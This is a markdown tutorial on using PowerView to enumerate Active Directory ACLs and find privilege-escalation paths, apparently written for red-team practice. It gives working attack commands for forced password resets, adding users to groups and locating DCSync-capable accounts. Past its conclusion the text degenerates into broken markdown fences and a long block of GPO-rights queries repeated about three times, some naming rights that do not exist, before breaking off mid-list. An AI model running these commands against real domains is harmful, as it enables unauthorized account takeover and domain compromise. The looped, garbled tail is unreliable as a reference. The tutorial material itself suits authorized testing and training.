```markdown
# 🛰️ PowerView ACL Enumeration Guide

## 🔑 Overview

PowerView is a powerful tool for Active Directory (AD) enumeration and reconnaissance. This guide focuses on advanced ACL (Access Control List) enumeration techniques using PowerView to identify potential attack paths within an AD environment.

---

## ⚙️ Initial Setup & Module Import

```powershell
# Navigate to the directory containing PowerView.ps1
Set-Location C:\Path\To\PowerViewDirectory

# Import PowerView module
Import-Module .\PowerView.ps1
```

### 📄 SID Conversion and GUID Resolution

Before running ACL enumeration commands, it's essential to convert user names to SIDs (Security Identifiers) for precise filtering. Additionally, use the `-ResolveGUIDs` parameter to get human-readable output.

```powershell
# Convert username to SID
$sid = Convert-NameToSid -Identity damundsen

# Resolve GUIDs and find ACLs for a specific user
Get-DomainObjectACL -ResolveGUIDs -Identity $sid | Select-Object SecurityIdentifier, ObjectAceType
```

### 🎯 Targeted Enumeration Workflow

1. **Identify Controlled User**:
   ```powershell
   # Convert user name to SID
   $controlledUserSID = Convert-NameToSid damundsen
   ```

2. **Find ACLs for Controlled User**:
   ```powershell
   # Resolve GUIDs and find ACLs for a specific user
   Get-DomainObjectACL -ResolveGUIDs -Identity $controlledUserSID | Select-Object SecurityIdentifier, ObjectAceType
   ```

3. **Analyze Target Objects**:
   ```powershell
   # Analyze the ACL of a specific target object (e.g., Help Desk Level 1)
   Get-DomainObjectACL -ResolveGUIDs -Identity "Help Desk Level 1" | Select-Object SecurityIdentifier, ObjectAceType
   ```

4. **Recursive Enumeration**:
   ```powershell
   # Recursively find new targets and repeat the process
   $newTargetSID = Convert-NameToSid HelpDeskLevel1
   Get-DomainObjectACL -ResolveGUIDs -Identity $newTargetSID | Select-Object SecurityIdentifier, ObjectAceType
   ```

---

## 📊 Detailed ACL Enumeration Techniques

### 🔧 Advanced ACL Enumeration Techniques

#### 🎯 **Targeted Rights Enumeration**
```powershell
# Find users with specific rights (ForceChangePassword)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "User-Force-Change-Password"}

# Find GenericAll rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# Find WriteProperty rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# Find Group Membership manipulation rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -match "Self-Membership"}
```

#### 🔍 **Object-Specific ACL Analysis**
```powershell
# Analyze specific group ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity "Domain Admins"

# Analyze specific user ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity Administrator

# Analyze computer object ACLs
Get-DomainObjectACL -ResolveGUIDs -Identity "ACADEMY-EA-DC01$"

# Analyze GPO ACLs
Get-DomainGPO | Get-DomainObjectACL -ResolveGUIDs
```

#### 📊 **ACL Statistics and Analysis**
```powershell
# Count rights by type
Get-DomainObjectACL -ResolveGUIDs -Identity * | Group-Object ObjectAceType | Sort-Object Count -Descending

# Find users with most rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | Group-Object SecurityIdentifier | Sort-Object Count -Descending

# Analyze inheritance patterns
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.IsInherited -eq $false} | Group-Object ObjectAceType
```

---

## 🛠️ Common ACL Attack Patterns

### 🔑 **Password Reset Rights**
```powershell
# Find all Force-Change-Password rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "User-Force-Change-Password"}

# Attack: Force password reset
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $UserPassword
```

### 👥 **Group Membership Manipulation**
```powershell
# Find Self-Membership rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -eq "Self-Membership"}

# Attack: Add user to group
Add-DomainGroupMember -Identity "Help Desk Level 1" -Members damundsen
```

### 🎯 **GenericAll Exploitation**
```powershell
# Find GenericAll rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# Exploitation options:
# 1. Password reset
# 2. Add to groups  
# 3. Modify attributes
# 4. Enable/disable accounts
# 5. Set SPNs for Kerberoasting
```

### 🔄 **DCSync Rights Discovery**
```powershell
# Find DCSync-capable accounts
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"}

# Verify both required rights:
# - DS-Replication-Get-Changes
# - DS-Replication-Get-Changes-All (or In-Filtered-Set)
```

---

## 🎓 Key Learning Objectives

### ✅ **PowerView Mastery**
- **Targeted Enumeration**: Start from controlled users, not broad sweeps
- **SID Conversion**: `Convert-NameToSid` for efficient searches
- **GUID Resolution**: Always use `-ResolveGUIDs` for readable output
- **Object Filtering**: Use `SecurityIdentifier` filtering for precise results

### 🎯 **Attack Path Discovery**
- **Multi-Hop Thinking**: Each compromised user opens new attack vectors
- **Group Nesting**: Understand transitive group membership privileges
- **Rights Escalation**: Map from basic user to domain admin systematically
- **Documentation**: Track each hop in the attack chain

### 📊 **BloodHound Integration**
- **Visual Confirmation**: Use BloodHound to verify manual enumeration
- **Path Optimization**: Find shortest routes to high-value targets
- **Query Mastery**: Leverage pre-built and custom Cypher queries
- **Help Resources**: Utilize right-click help for attack techniques

### ⚠️ **Operational Considerations**
- **Time Management**: Avoid getting lost in massive ACL outputs
- **Target Prioritization**: Focus on privileged groups and admin accounts
- **Alternative Methods**: Have backup techniques when tools are blocked
- **Performance Impact**: Large environment enumeration can be resource-intensive

---

## ⚡ Quick Reference Commands

### 🔧 **Essential ACL Enumeration Workflow**
```powershell
# 1. Import PowerView
Import-Module .\PowerView.ps1

# 2. Convert controlled user to SID
$sid = Convert-NameToSid [USERNAME]

# 3. Find rights (with GUID resolution)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# 4. Analyze target objects
Get-DomainObjectACL -ResolveGUIDs -Identity [TARGET_OBJECT]

# 5. Check group memberships
Get-DomainGroup -Identity [GROUP_NAME] | select memberof

# 6. Recursive enumeration for attack paths
# Repeat steps 2-5 for each discovered target
```

### 📊 **Common ACL Rights Reference**

| **Right Type** | **Capability** | **Attack Vector** |
|----------------|----------------|-------------------|
| **User-Force-Change-Password** | Reset user passwords | Password reset attack |
| **GenericAll** | Full control over object | Complete compromise |
| **GenericWrite** | Modify object properties | Group membership, attributes |
| **Self-Membership** | Add self to group | Privilege escalation |
| **DS-Replication-Get-Changes** | Domain replication | DCSync attack |
| **WriteProperty** | Modify specific properties | Targeted attribute changes |

---

## 🔑 Key Takeaways

### ✅ **ACL Enumeration Best Practices**
- **Start Targeted**: Begin with controlled users, not domain-wide sweeps
- **Use -ResolveGUIDs**: Always prefer human-readable output
- **Think Multi-Hop**: Each user compromise opens new attack vectors
- **Document Paths**: Track the full attack chain for reporting

### 🎯 **Strategic Enumeration**
- **User → Group → User Chains**: Most common privilege escalation pattern
- **Group Nesting**: Critical for transitive privilege inheritance
- **High-Value Targets**: Domain Admins, Exchange admins, service accounts
- **DCSync Rights**: Ultimate goal for credential extraction

### ⚠️ **Operational Insights**
- **Time Boxing**: Don't get lost in massive ACL outputs
- **Tool Redundancy**: Have PowerShell alternatives when PowerView fails
- **BloodHound Confirmation**: Visual validation of discovered paths
- **Performance Awareness**: Large enumeration can impact target systems

### 🎯 **Example Attack Path**
```plaintext
damundsen -> Help Desk Level 1 -> Domain Admins
```
---

This guide provides a comprehensive approach to using PowerView for advanced ACL enumeration in Active Directory environments. By following these steps and techniques, you can effectively identify potential attack paths and vulnerabilities.
```markdown

---


```powershell
# Additional example commands for reference
Get-DomainObjectACL -ResolveGUIDs -Identity "CN=damundsen,CN=Users,DC=example,DC=com"
Get-DomainGPO | Get-DomainObjectACL -ResolveGUIDs
```

These additional commands can help further refine and extend the ACL enumeration process within your specific environment. 

```markdown

```powershell
# Example of finding all users with GenericAll rights
$usersWithGenericAll = Get-DomainUser | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DistinguishedName) |
    ? {$_.ActiveDirectoryRights -match "GenericAll"}
}
$usersWithGenericAll
```

By leveraging these advanced techniques, you can uncover potential security weaknesses in your Active Directory environment and take proactive steps to mitigate risks.

```markdown

---


# 📜 Conclusion

This guide has provided an in-depth look at using PowerView for ACL enumeration in AD environments. By following the outlined steps and utilizing targeted enumeration techniques, you can effectively identify and exploit vulnerabilities within your network. Remember to document each step of the process and utilize tools like BloodHound for additional insights.

---

## 📫 Contact

For more information or assistance with PowerView and Active Directory security, feel free to contact the author or reach out through the following channels:

- GitHub: [PowerView Repository](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- Twitter: [@PowerShellMafia](https://twitter.com/powershellmafia)

Thank you for using PowerView ACL Enumeration Guide!
```markdown

---


This guide aims to help security professionals and red team members effectively leverage PowerView for advanced Active Directory reconnaissance. For any further questions or clarifications, reach out via the provided channels.

```powershell
# Example of finding all users with ForceChangePassword rights
$usersWithForceChange = Get-DomainUser | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DistinguishedName) |
    ? {$_.ObjectAceType -eq "User-Force-Change-Password"}
}
$usersWithForceChange
```

By identifying users with ForceChangePassword rights, you can plan targeted attacks to reset user passwords and gain unauthorized access.

---

# 🛠️ Tools & Resources

### BloodHound
[Download BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) - A visualization tool for Active Directory attack paths.

### PowerSploit
[PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) - Collection of PowerShell scripts for AD reconnaissance and exploitation.

---


# 📚 References

- [BloodHound Documentation](https://bloodhound.readthedocs.io/en/latest/)
- [Active Directory Security Best Practices](https://docs.microsoft.com/en-us/windows-server/security/auditing-guidance-for-active-directory)

---

Thank you for using this guide. Happy hunting and stay secure!
```markdown
```powershell

# Example of finding all GPOs with GenericAll rights
$gposWithGenericAll = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericAll"}
}
$gposWithGenericAll

# Example of finding all GPOs with WriteProperty rights
$gposWithWriteProperty = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteProperty"}
}
$gposWithWriteProperty

# Example of finding all GPOs with DCSync rights
$gposWithDCSync = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ObjectAceType -match "DS-Replication-GetChanges"}
}
$gposWithDCSync

# Example of finding all GPOs with Self-Membership rights
$gposWithSelfMembership = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ObjectAceType -match "Self-Membership"}
}
$gposWithSelfMembership

# Example of finding all GPOs with ForceChangePassword rights
$gposWithForceChange = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ObjectAceType -eq "User-Force-Change-Password"}
}
$gposWithForceChange

# Example of finding all GPOs with GenericWrite rights
$gposWithGenericWrite = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericWrite"}
}
$gposWithGenericWrite

# Example of finding all GPOs with GenericRead rights
$gposWithGenericRead = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericRead"}
}
$gposWithGenericRead

# Example of finding all GPOs with GenericExecute rights
$gposWithGenericExecute = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericExecute"}
}
$gposWithGenericExecute

# Example of finding all GPOs with ReadProperty rights
$gposWithReadProperty = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ReadProperty"}
}
$gposWithReadProperty

# Example of finding all GPOs with WriteOwner rights
$gposWithWriteOwner = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteOwner"}
}
$gposWithWriteOwner

# Example of finding all GPOs with WriteDacl rights
$gposWithWriteDacl = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteDacl"}
}
$gposWithWriteDacl

# Example of finding all GPOs with Delete rights
$gposWithDelete = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "Delete"}
}
$gposWithDelete

# Example of finding all GPOs with DeleteChild rights
$gposWithDeleteChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteChild"}
}
$gposWithDeleteChild

# Example of finding all GPOs with AllExtendedRights rights
$gposWithAllExtendedRights = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "AllExtendedRights"}
}
$gposWithAllExtendedRights

# Example of finding all GPOs with ReplicateDirectory rights
$gposWithReplicateDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ReplicateDirectory"}
}
$gposWithReplicateDirectory

# Example of finding all GPOs with ListChildren rights
$gposWithListChildren = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListChildren"}
}
$gposWithListChildren

# Example of finding all GPOs with ListObject rights
$gposWithListObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListObject"}
}
$gposWithListObject

# Example of finding all GPOs with ListDirectory rights
$gposWithListDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListDirectory"}
}
$gposWithListDirectory

# Example of finding all GPOs with CreateChild rights
$gposWithCreateChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateChild"}
}
$gposWithCreateChild

# Example of finding all GPOs with CreateGeneric rights
$gposWithCreateGeneric = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateGeneric"}
}
$gposWithCreateGeneric

# Example of finding all GPOs with CreateObject rights
$gposWithCreateObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateObject"}
}
$gposWithCreateObject

# Example of finding all GPOs with ExecuteScript rights
$gposWithExecuteScript = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ExecuteScript"}
}
$gposWithExecuteScript

# Example of finding all GPOs with CreateLink rights
$gposWithCreateLink = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateLink"}
}
$gposWithCreateLink

# Example of finding all GPOs with CreateAllExtended rights
$gposWithCreateAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateAllExtended"}
}
$gposWithCreateAllExtended

# Example of finding all GPOs with WriteAllExtended rights
$gposWithWriteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteAllExtended"}
}
$gposWithWriteAllExtended

# Example of finding all GPOs with DeleteAllExtended rights
$gposWithDeleteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteAllExtended"}
}
$gposWithDeleteAllExtended

# Example of finding all GPOs with DeleteSubtree rights
$gposWithDeleteSubtree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteSubtree"}
}
$gposWithDeleteSubtree

# Example of finding all GPOs with DeleteTree rights
$gposWithDeleteTree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteTree"}
}
$gposWithDeleteTree

# Example of finding all GPOs with ForceReplication rights
$gposWithForceReplication = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ForceReplication"}
}
$gposWithForceReplication

# Example of finding all GPOs with GenericAll rights
$gposWithGenericAll = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericAll"}
}
$gposWithGenericAll

# Example of finding all GPOs with GenericWrite rights
$gposWithGenericWrite = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericWrite"}
}
$gposWithGenericWrite

# Example of finding all GPOs with GenericRead rights
$gposWithGenericRead = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericRead"}
}
$gposWithGenericRead

# Example of finding all GPOs with GenericExecute rights
$gposWithGenericExecute = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericExecute"}
}
$gposWithGenericExecute

# Example of finding all GPOs with WriteOwner rights
$gposWithWriteOwner = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteOwner"}
}
$gposWithWriteOwner

# Example of finding all GPOs with WriteDacl rights
$gposWithWriteDacl = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteDacl"}
}
$gposWithWriteDacl

# Example of finding all GPOs with Delete rights
$gposWithDelete = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "Delete"}
}
$gposWithDelete

# Example of finding all GPOs with DeleteChild rights
$gposWithDeleteChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteChild"}
}
$gposWithDeleteChild

# Example of finding all GPOs with AllExtendedRights rights
$gposWithAllExtendedRights = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "AllExtendedRights"}
}
$gposWithAllExtendedRights

# Example of finding all GPOs with ReplicateDirectory rights
$gposWithReplicateDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ReplicateDirectory"}
}
$gposWithReplicateDirectory

# Example of finding all GPOs with ListChildren rights
$gposWithListChildren = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListChildren"}
}
$gposWithListChildren

# Example of finding all GPOs with ListObject rights
$gposWithListObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListObject"}
}
$gposWithListObject

# Example of finding all GPOs with ListDirectory rights
$gposWithListDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListDirectory"}
}
$gposWithListDirectory

# Example of finding all GPOs with CreateChild rights
$gposWithCreateChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateChild"}
}
$gposWithCreateChild

# Example of finding all GPOs with CreateGeneric rights
$gposWithCreateGeneric = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateGeneric"}
}
$gposWithCreateGeneric

# Example of finding all GPOs with CreateObject rights
$gposWithCreateObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateObject"}
}
$gposWithCreateObject

# Example of finding all GPOs with ExecuteScript rights
$gposWithExecuteScript = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ExecuteScript"}
}
$gposWithExecuteScript

# Example of finding all GPOs with CreateLink rights
$gposWithCreateLink = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateLink"}
}
$gposWithCreateLink

# Example of finding all GPOs with CreateAllExtended rights
$gposWithCreateAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateAllExtended"}
}
$gposWithCreateAllExtended

# Example of finding all GPOs with WriteAllExtended rights
$gposWithWriteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteAllExtended"}
}
$gposWithWriteAllExtended

# Example of finding all GPOs with DeleteAllExtended rights
$gposWithDeleteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteAllExtended"}
}
$gposWithDeleteAllExtended

# Example of finding all GPOs with DeleteSubtree rights
$gposWithDeleteSubtree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteSubtree"}
}
$gposWithDeleteSubtree

# Example of finding all GPOs with DeleteTree rights
$gposWithDeleteTree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteTree"}
}
$gposWithDeleteTree

# Example of finding all GPOs with ForceReplication rights
$gposWithForceReplication = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ForceReplication"}
}
$gposWithForceReplication

# Example of finding all GPOs with GenericAll rights
$gposWithGenericAll = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericAll"}
}
$gposWithGenericAll

# Example of finding all GPOs with GenericWrite rights
$gposWithGenericWrite = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericWrite"}
}
$gposWithGenericWrite

# Example of finding all GPOs with GenericRead rights
$gposWithGenericRead = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericRead"}
}
$gposWithGenericRead

# Example of finding all GPOs with GenericExecute rights
$gposWithGenericExecute = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "GenericExecute"}
}
$gposWithGenericExecute

# Example of finding all GPOs with WriteOwner rights
$gposWithWriteOwner = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteOwner"}
}
$gposWithWriteOwner

# Example of finding all GPOs with WriteDacl rights
$gposWithWriteDacl = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteDacl"}
}
$gposWithWriteDacl

# Example of finding all GPOs with Delete rights
$gposWithDelete = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "Delete"}
}
$gposWithDelete

# Example of finding all GPOs with DeleteChild rights
$gposWithDeleteChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteChild"}
}
$gposWithDeleteChild

# Example of finding all GPOs with AllExtendedRights rights
$gposWithAllExtendedRights = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "AllExtendedRights"}
}
$gposWithAllExtendedRights

# Example of finding all GPOs with ReplicateDirectory rights
$gposWithReplicateDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ReplicateDirectory"}
}
$gposWithReplicateDirectory

# Example of finding all GPOs with ListChildren rights
$gposWithListChildren = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListChildren"}
}
$gposWithListChildren

# Example of finding all GPOs with ListObject rights
$gposWithListObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListObject"}
}
$gposWithListObject

# Example of finding all GPOs with ListDirectory rights
$gposWithListDirectory = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ListDirectory"}
}
$gposWithListDirectory

# Example of finding all GPOs with CreateChild rights
$gposWithCreateChild = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateChild"}
}
$gposWithCreateChild

# Example of finding all GPOs with CreateGeneric rights
$gposWithCreateGeneric = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateGeneric"}
}
$gposWithCreateGeneric

# Example of finding all GPOs with CreateObject rights
$gposWithCreateObject = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateObject"}
}
$gposWithCreateObject

# Example of finding all GPOs with ExecuteScript rights
$gposWithExecuteScript = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ExecuteScript"}
}
$gposWithExecuteScript

# Example of finding all GPOs with CreateLink rights
$gposWithCreateLink = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateLink"}
}
$gposWithCreateLink

# Example of finding all GPOs with CreateAllExtended rights
$gposWithCreateAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "CreateAllExtended"}
}
$gposWithCreateAllExtended

# Example of finding all GPOs with WriteAllExtended rights
$gposWithWriteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "WriteAllExtended"}
}
$gposWithWriteAllExtended

# Example of finding all GPOs with DeleteAllExtended rights
$gposWithDeleteAllExtended = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteAllExtended"}
}
$gposWithDeleteAllExtended

# Example of finding all GPOs with DeleteSubtree rights
$gposWithDeleteSubtree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteSubtree"}
}
$gposWithDeleteSubtree

# Example of finding all GPOs with DeleteTree rights
$gposWithDeleteTree = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "DeleteTree"}
}
$gposWithDeleteTree

# Example of finding all GPOs with ForceReplication rights
$gposWithForceReplication = Get-DomainGPO | Where-Object {
    (Get-DomainObjectACL -ResolveGUIDs -Identity $_.DN) |
    ? {$_.ActiveDirectoryRights -match "ForceReplication"}
}
$gposWithForceReplication

# Example of finding all GPOs with GenericAll rights
